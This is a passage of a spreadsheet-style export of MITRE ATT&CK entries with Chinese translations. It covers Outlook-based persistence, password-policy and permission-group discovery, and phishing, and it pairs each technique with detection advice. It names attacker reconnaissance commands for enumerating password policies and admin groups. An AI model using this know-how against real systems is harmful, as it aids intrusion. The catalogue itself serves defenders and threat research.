Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.","Office 365, Windows","Application Log: Application Log Content, Command: Command Execution, Process: Process Creation",True,T1137,,,"Administrator, User",,,,,,"(Citation: SensePost Ruler GitHub),(Citation: SensePost Outlook Home Page),(Citation: SensePost Outlook Forms),(Citation: win10_asr)",Office 应用程序启动：Outlook 表单,攻击者可能会滥用 Microsoft Outlook 表单来获取受感染系统的持久性。 Outlook 表单用作 Outlook 邮件中的演示和功能模板。可以创建自定义 Outlook 表单，当攻击者使用相同的自定义 Outlook 表单发送特制的电子邮件时，该表单将执行代码。（引用：SensePost Outlook 表单）一旦恶意表单被添加到用户的邮箱，它们将在Outlook 已启动。当对手向用户发送特制的电子邮件时，恶意表单将执行。（引用：SensePost Outlook 表单）
T1137.004,Office Application Startup: Outlook Home Page,"Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)

Once malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home Page)
",https://attack.mitre.org/techniques/T1137/004,07 November 2019,16 August 2021,1.1,Persistence,"Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)

Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.","Office 365, Windows","Application Log: Application Log Content, Command: Command Execution, Process: Process Creation",True,T1137,,,"Administrator, User",,,,,,"(Citation: SensePost Ruler GitHub),(Citation: FireEye Outlook Dec 2019),(Citation: SensePost Outlook Home Page),(Citation: SensePost Outlook Forms),(Citation: win10_asr)",Office 应用程序启动：Outlook 主页,攻击者可能会滥用 Microsoft Outlook 的主页功能来获得受感染系统的持久性。 Outlook 主页是一项旧功能，用于自定义 Outlook 文件夹的呈现方式。此功能允许在打开文件夹时加载和显示内部或外部 URL。可以制作恶意 HTML 页面，在 Outlook 主页加载时执行代码。（引用：SensePost Outlook 主页）一旦将恶意主页添加到用户的邮箱，它们将在 Outlook 启动时加载。恶意主页将在正确的 Outlook 文件夹被加载/重新加载时执行。（引用：SensePost Outlook 主页）
T1137.005,Office Application Startup: Outlook Rules,"Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.(Citation: SilentBreak Outlook Rules)

Once malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.(Citation: SilentBreak Outlook Rules)",https://attack.mitre.org/techniques/T1137/005,07 November 2019,15 October 2021,1.1,Persistence,"Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) This PowerShell script is ineffective in gathering rules with modified `PRPR_RULE_MSG_NAME` and `PR_RULE_MSG_PROVIDER` properties caused by adversaries using a Microsoft Exchange Server Messaging API Editor (MAPI Editor), so only examination with the Exchange Administration tool MFCMapi can reveal these mail forwarding rules.(Citation: Pfammatter - Hidden Inbox Rules) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)

Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.","Office 365, Windows","Application Log: Application Log Content, Command: Command Execution, Process: Process Creation",True,T1137,,Microsoft Security,"Administrator, User",,,,,,"(Citation: SensePost Ruler GitHub),(Citation: SensePost Outlook Home Page),(Citation: SensePost Outlook Forms),(Citation: win10_asr)",Office 应用程序启动：Outlook 规则,攻击者可能会滥用 Microsoft Outlook 规则来获得受感染系统的持久性。 Outlook 规则允许用户定义自动行为来管理电子邮件。例如，如果电子邮件包含来自特定发件人的特定字词，良性规则可能会自动将电子邮件移动到 Outlook 中的特定文件夹。可以创建恶意 Outlook 规则，当对手向该用户发送特制的电子邮件时触发代码执行。（引用：SilentBreak Outlook 规则）一旦将恶意规则添加到用户的邮箱，它们将在 Outlook 启动时加载。当对手向用户发送特制的电子邮件时，将执行恶意规则。（引用：SilentBreak Outlook 规则）
T1201,Password Policy Discovery,"Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).

Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code> (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to discover password policy information (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).(Citation: US-CERT-TA18-106A)

Password policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS (Citation: AWS GetPasswordPolicy).",https://attack.mitre.org/techniques/T1201,18 April 2018,06 September 2022,1.5,Discovery,Monitor logs and processes for tools and command line arguments that may indicate they're being used for password policy discovery. Correlate that activity with other suspicious activity from the originating system to reduce potential false positives from valid user or administrator activity. Adversaries will likely attempt to find the password policy early in an operation and the activity is likely to happen with other Discovery activity.,"IaaS, Linux, Network, Windows, macOS","Command: Command Execution, Process: Process Creation, User Account: User Account Metadata",False,,,"Austin Clark, @c2defense; Isif Ibrahima, Mandiant; Regina Elwell; Sudhanshu Chauhan, @Sudhanshu_C",,,,,,,"(Citation: NCC Group Chimera January 2021),(Citation: Symantec Orangeworm April 2018),(Citation: Savill 1999),(Citation: ESET ComRAT May 2020),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: CME Github September 2018),(Citation: FireEye Targeted Attacks Middle East Banks),(Citation: CrowdStrike BloodHound April 2018),(Citation: GitHub PoshC2),(Citation: Microsoft Install Password Filter n.d)",密码策略发现,攻击者可能会尝试访问有关企业网络或云环境中使用的密码策略的详细信息。密码策略是一种通过 [蛮力] (https://attack.mitre.org/techniques/T1110) 实施难以猜测或破解的复杂密码的方法。此信息可以帮助攻击者创建常用密码列表并发起字典和/或符合策略的蛮力攻击（例如，如果最小密码长度应为 8，则不尝试密码，例如“pass123”；不检查如果锁定设置为 6 以不锁定帐户，则每个帐户的密码超过 3-4 个）。可以通过各种命令外壳实用程序（例如 <code>net accounts (/domain)</code>、<code>Get-ADDefaultDomainPasswordPolicy</code>、<code> 在 Windows、Linux 和 macOS 系统上设置和发现密码策略chage -l <username></code>、<code>cat /etc/pam.d/common-password</code> 和 <code>pwpolicy getaccountpolicies</code>（引用：超级用户 Linux 密码策略）（引用: Jamf 用户密码策略）。攻击者还可以利用网络设备上的 [网络设备 CLI](https://attack.mitre.org/techniques/T1059/008) 来发现密码策略信息（例如 <code>show aaa</code>、<code> show aaa common-criteria policy all</code>）。（引用：US-CERT-TA18-106A）可以使用 AWS 中的可用 API（例如 <code>GetAccountPasswordPolicy</code>）在云环境中发现密码策略（引用： AWS GetPasswordPolicy）。
T1120,Peripheral Device Discovery,"Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",https://attack.mitre.org/techniques/T1120,31 May 2017,11 March 2022,1.3,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution, Process: Process Creation",False,,,,"Administrator, SYSTEM, User",,,CAPEC-646,,,"(Citation: Symantec Chafer Dec 2015),(Citation: Kaspersky Adwind Feb 2016),(Citation: Fidelis njRAT June 2013),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: ESET Gamaredon June 2020),(Citation: Kaspersky Equation QA),(Citation: EFF Manul Aug 2016),(Citation: FoxIT Wocao December 2019),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Unit42 Redaman January 2019),(Citation: ESET RTM Feb 2017),(Citation: Sophos Ragnar May 2020),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: ESET Machete July 2019),(Citation: ESET Crutch December 2020),(Citation: Talos Oblique RAT March 2021),(Citation: FireEye WannaCry 2017),(Citation: Unit42 Cannon Nov 2018),(Citation: Proofpoint TA505 Mar 2018),(Citation: Kaspersky WIRTE November 2021),(Citation: Microsoft SIR Vol 19),(Citation: Palo Alto MoonWind March 2017),(Citation: ESET Sednit Part 2),(Citation: ESET ComRAT May 2020),(Citation: ESET Operation Groundbait),(Citation: Trend Micro Qakbot May 2020),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Antiy CERT Ramsay April 2020),(Citation: Trend Micro njRAT 2018),(Citation: Kaspersky MoleRATs April 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Securelist ScarCruft May 2019),(Citation: Palo Alto T9000 Feb 2016),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Sentinel Labs WastedLocker July 2020),(Citation: Check Point APT34 April 2021),(Citation: ESET Attor Oct 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: Kaspersky TajMahal April 2019),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Forcepoint Monsoon),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Prevailion DarkWatchman 2021),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Cisco Talos Intelligence Group),(Citation: Eset Ramsay May 2020),(Citation: Microsoft Actinium February 2022),(Citation: ESET Sednit USBStealer 2014),",外围设备发现,攻击者可能会尝试收集有关连接到计算机系统的附加外围设备和组件的信息。（引用：Peripheral Discovery Linux）（引用：Peripheral Discovery macOS）外围设备可能包括支持各种功能的辅助资源，例如键盘、打印机、相机、智能卡读卡器或可移动存储设备。该信息可用于增强他们对系统和网络环境的认识，或可用于进一步的行动。
T1069,Permission Groups Discovery,"Adversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.",https://attack.mitre.org/techniques/T1069,31 May 2017,15 October 2021,2.4,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). Monitor container logs for commands and/or API calls related to listing permissions for pods and nodes, such as <code>kubectl auth can-i</code>.(Citation: K8s Authorization Overview)","Azure AD, Containers, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Command: Command Execution, Group: Group Enumeration, Group: Group Metadata, Pod: Pod Metadata, Process: Process Creation",False,,,"Daniel Prizmant, Palo Alto Networks; Microsoft Threat Intelligence Center (MSTIC); Yuval Avrahami, Palo Alto Networks",User,,,CAPEC-576,,,"(Citation: Cyberreason Anchor December 2019),(Citation: GovCERT Carbon May 2016),(Citation: Unit 42 Siloscape Jun 2021),(Citation: FOX-IT May 2016 Mofang),(Citation: IBM TA505 April 2020),(Citation: Volexity SolarWinds),(Citation: Symantec Buckeye),(Citation: Trend Micro TA505 June 2019),(Citation: FireEye Periscope March 2018),(Citation: IBM IcedID November 2017),",权限组发现,攻击者可能会尝试查找组和权限设置。此信息可以帮助攻击者确定哪些用户帐户和组可用、特定组中用户的成员身份以及哪些用户和组具有提升的权限。
T1069.003,Permission Groups Discovery: Cloud Groups,"Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.

With authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts (Citation: Microsoft Msolrole)(Citation: GitHub Raindance).

Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API Documentation)

Adversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API (Citation: AWS Get Bucket ACL). Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.",https://attack.mitre.org/techniques/T1069/003,21 February 2020,19 April 2022,1.3,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Activity and account logs for the cloud services can also be monitored for suspicious commands that are anomalous compared to a baseline of normal activity.","Azure AD, Google Workspace, IaaS, Office 365, SaaS","Application Log: Application Log Content, Command: Command Execution, Group: Group Enumeration, Group: Group Metadata, Process: Process Creation",True,T1069,,"Isif Ibrahima, Mandiant; Regina Elwell",,,,,,,"(Citation: Roadtools),(Citation: AADInternals Documentation),",权限组发现：云组,攻击者可能会尝试查找云组和权限设置。云权限组的知识可以帮助攻击者确定环境中用户和组的特定角色，以及哪些用户与特定组相关联。通过经过身份验证的访问，有多种工具可用于查找权限组。 <code>Get-MsolRole</code> PowerShell cmdlet 可用于获取 Exchange 和 Office 365 帐户的角色和权限组（引用：Microsoft Msolrole）（引用：GitHub Raindance）。 Azure CLI (AZ CLI) 和 Google Cloud Identity Provider API 也提供了获取权限组的接口。命令 <code>az ad user get-member-groups</code> 将列出与 Azure 用户帐户关联的组，而 API 终端 <code>GET https://cloudidentity.googleapis.com/v1/groups</code>代码> 列出 Google 用户可用的组资源。（引用：Microsoft AZ CLI）（引用：Black Hills Red Teaming MS AD Azure，2018）（引用：Google Cloud Identity API 文档）攻击者可能会尝试列出对象的 ACL确定有权访问对象的所有者和其他账户，例如，通过 AWS <code>GetBucketAcl</code> API（引用：AWS Get Bucket ACL）。使用此信息，攻击者可以针对具有给定对象权限的帐户或利用他们已经入侵的帐户来访问该对象。
T1069.002,Permission Groups Discovery: Domain Groups,"Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.

Commands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.",https://attack.mitre.org/techniques/T1069/002,21 February 2020,21 October 2022,1.1,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","Linux, Windows, macOS","Command: Command Execution, Group: Group Enumeration, Process: OS API Execution, Process: Process Creation",True,T1069,,"Harshal Tupsamudre, Qualys; Miriam Wiesner, @miriamxyra, Microsoft Security",,,,,,,"(Citation: CISA SoreFang July 2016),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: FireEye FIN6 Apr 2019),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Symantec Inception Framework March 2018),(Citation: Secureworks REvil September 2019),(Citation: Savill 1999),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: McAfee Sodinokibi October 2019),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: CME Github September 2018),(Citation: TechNet Dsquery),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Unit 42 Playbook Dec 2017),(Citation: Symantec Bumblebee June 2022),(Citation: Symantec Buckeye),(Citation: Palo Alto OilRig May 2016),(Citation: ESET ComRAT May 2020),(Citation: Intrinsec Egregor Nov 2020),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: SecureList Griffon May 2019),(Citation: US-CERT TA18-074A),(Citation: CISA WellMess July 2020),(Citation: Symantec Orangeworm April 2018),(Citation: FireEye APT34 Dec 2017),(Citation: Kaspersky Sodin July 2019),(Citation: DFIR Conti Bazar Nov 2021),(Citation: CrowdStrike BloodHound April 2018),",权限组发现：域组,攻击者可能会尝试查找域级组和权限设置。域级权限组的知识可以帮助攻击者确定存在哪些组以及哪些用户属于特定组。攻击者可能会使用此信息来确定哪些用户具有提升的权限，例如域管理员。 [Net](https://attack.mitre.org/software/S0039) 实用程序的 <code>net group /domain</code> 等命令，macOS 上的 <code>dscacheutil -q group</code>， Linux 上的 <code>ldapsearch</code> 可以列出域级别的组。
T1069.001,Permission Groups Discovery: Local Groups,"Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.

Commands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.",https://attack.mitre.org/techniques/T1069/001,12 March 2020,25 August 2022,1.1,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","Linux, Windows, macOS","Command: Command Execution, Group: Group Enumeration, Group: Group Enumeration, Process: OS API Execution, Process: Process Creation",True,T1069,,"Harshal Tupsamudre, Qualys; Miriam Wiesner, @miriamxyra, Microsoft Security",,,,,,,"(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Savill 1999),(Citation: Kaspersky Lyceum October 2021),(Citation: FoxIT Wocao December 2019),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Unit 42 Playbook Dec 2017),(Citation: Kaspersky Turla Aug 2014),(Citation: Proofpoint TA505 Mar 2018),(Citation: Palo Alto OilRig May 2016),(Citation: Symantec Buckeye),(Citation: Kaspersky QakBot September 2021),(Citation: ESET ComRAT May 2020),(Citation: TrendMicro Tonto Team October 2020),(Citation: Korean FSI TA505 2020),(Citation: NTT Security Flagpro new December 2021),(Citation: Unit 42 Kazuar May 2017),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: GitHub PoshC2),(Citation: NCC Group Chimera January 2021),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: FireEye admin@338),(Citation: Microsoft PLATINUM April 2016),(Citation: Baumgartner Naikon 2015),(Citation: Symantec Orangeworm April 2018),(Citation: FireEye APT34 Dec 2017),(Citation: Emissary Trojan Feb 2016),(Citation: DFIR Conti Bazar Nov 2021),(Citation: CrowdStrike BloodHound April 2018),",权限组发现：本地组,攻击者可能会尝试查找本地系统组和权限设置。本地系统权限组的知识可以帮助攻击者确定存在哪些组以及哪些用户属于特定组。攻击者可能会使用此信息来确定哪些用户具有提升的权限，例如在本地管理员组中找到的用户。 [Net](https://attack.mitre.org/software/S0039) 实用程序 <code>dscl 的 <code>net localgroup</code> 等命令。 macOS 上的 -list /Groups</code> 和 Linux 上的 <code>groups</code> 可以列出本地组。
T1566,Phishing,"Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.

Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source.",https://attack.mitre.org/techniques/T1566,02 March 2020,04 January 2022,2.2,Initial Access,"Network intrusion detection systems and email gateways can be used to detect phishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.

Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)

URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.

Because most common third-party services used for phishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware.

Anti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Many possible detections of follow-on behavior may take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.","Google Workspace, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, File: File Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,Philip Winther,,,,CAPEC-98,,,"(Citation: Cisco Group 72),(Citation: Novetta-Axiom),(Citation: Secureworks REvil September 2019),(Citation: Microsoft Anti Spoofing),(Citation: ACSC Email Spoofing)",网络钓鱼,攻击者可能会发送网络钓鱼消息以访问受害系统。所有形式的网络钓鱼都是以电子方式传递的社会工程。网络钓鱼可以成为目标，称为鱼叉式网络钓鱼。在鱼叉式网络钓鱼中，特定的个人、公司或行业将成为攻击者的目标。更一般地说，攻击者可以进行非目标网络钓鱼，例如大规模恶意软件垃圾邮件活动。攻击者可能会向受害者发送包含恶意附件或链接的电子邮件，通常是为了在受害者系统上执行恶意代码。网络钓鱼也可能通过第三方服务进行，例如社交媒体平台。网络钓鱼还可能涉及社会工程技术，例如冒充可信来源。
T1598,Phishing for Information,"Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566) in that the objective is gathering data from the victim rather than executing malicious code.

All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.

Adversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Phishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.",https://attack.mitre.org/techniques/T1598,02 October 2020,08 March 2022,1.1,Reconnaissance,"Depending on the specific method of phishing, the detections can vary. Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)

When it comes to following links, monitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links) can also help detect links leading to known malicious sites.

Monitor social media traffic for suspicious activity, including messages requesting information as well as abnormal file or data transfers (especially those involving unknown, or otherwise suspicious accounts).",PRE,"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,"Philip Winther; Robert Simmons, @MalwareUtkonos; Sebastian Salla, McAfee",,,,,,,"(Citation: Microsoft Targeting Elections September 2020),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Google Election Threats October 2020),(Citation: Microsoft Anti Spoofing),(Citation: ACSC Email Spoofing)",信息网络钓鱼/通过网络钓鱼收集信息,攻击者可能会发送网络钓鱼消息以获取可在定位期间使用的敏感信息。信息网络钓鱼是企图诱使目标泄露信息、经常是凭据或其他可操作信息。信息网络钓鱼与 [网络钓鱼](https://attack.mitre.org/techniques/T1566) 的不同之处在于，其目的是从受害者那里收集数据，而不是执行恶意代码。所有形式的网络钓鱼都是以电子方式传递的社会工程。网络钓鱼可以成为目标，称为鱼叉式网络钓鱼。在鱼叉式网络钓鱼中，特定的个人、公司或行业将成为攻击者的目标。更一般地，攻击者可以进行非目标网络钓鱼，例如在大规模凭据收集活动中。攻击者也可能尝试通过电子邮件、即时消息或其他电子对话方式直接获取信息。（引用：ThreatPost 社交媒体网络钓鱼）（引用：TrendMictro 网络钓鱼）（引用：PCMag FakeLogin）（引用：Sophos 附件）（引文：GitHub Phishery）信息网络钓鱼经常涉及社会工程技术，例如冒充来源收集信息（例如：[建立帐户]（https://attack.mitre.org/techniques/T1585）或[入侵帐户](https://attack.mitre.org/techniques/T1586)）和/或发送多个看似紧急的消息。
T1598.002,Phishing for Information: Spearphishing Attachment,"Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file.(Citation: Sophos Attachment)(Citation: GitHub Phishery) The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",https://attack.mitre.org/techniques/T1598/002,02 October 2020,15 April 2021,1.1,Reconnaissance,"Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)",PRE,"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1598,,"Philip Winther; Robert Simmons, @MalwareUtkonos; Sebastian Salla, McAfee",,,,,,,"(Citation: ATT Sidewinder January 2021),(Citation: US-CERT TA18-074A),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Cyble Sidewinder September 2020),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Microsoft Anti Spoofing),(Citation: ACSC Email Spoofing)",信息网络钓鱼/通过网络钓鱼收集信息：鱼叉式网络钓鱼附件,攻击者可能会发送带有恶意附件的鱼叉式钓鱼邮件，以获取可在定位期间使用的敏感信息。鱼叉式网络钓鱼是一种试图诱骗目标泄露信息、经常是凭据或其他可操作信息的尝试。信息鱼叉式网络钓鱼经常涉及社会工程技术，例如冒充来源收集信息（例如：[建立帐户](https://attack.mitre.org/techniques/T1585) 或[危害帐户](https ://attack.mitre.org/techniques/T1586)) 和/或发送多个看似紧急的消息。所有形式的鱼叉式网络钓鱼都是针对特定个人、公司或行业的电子社交工程。在这种情况下，攻击者将文件附加到鱼叉式网络钓鱼电子邮件中，并且通常依靠收件人填充信息然后返回文件。（引用：Sophos 附件）（引用：GitHub Phishery）鱼叉式网络钓鱼电子邮件的文本通常试图给出一个合理的理由为什么要填写该文件，例如向业务伙伴索取信息。攻击者还可能使用来自先前侦察工作的信息（例如：[搜索开放网站/域](https://attack.mitre.org/techniques/T1593) 或 [搜索受害者拥有的网站](https://attack.mitre .org/techniques/T1594)) 制作有说服力和可信的诱饵。
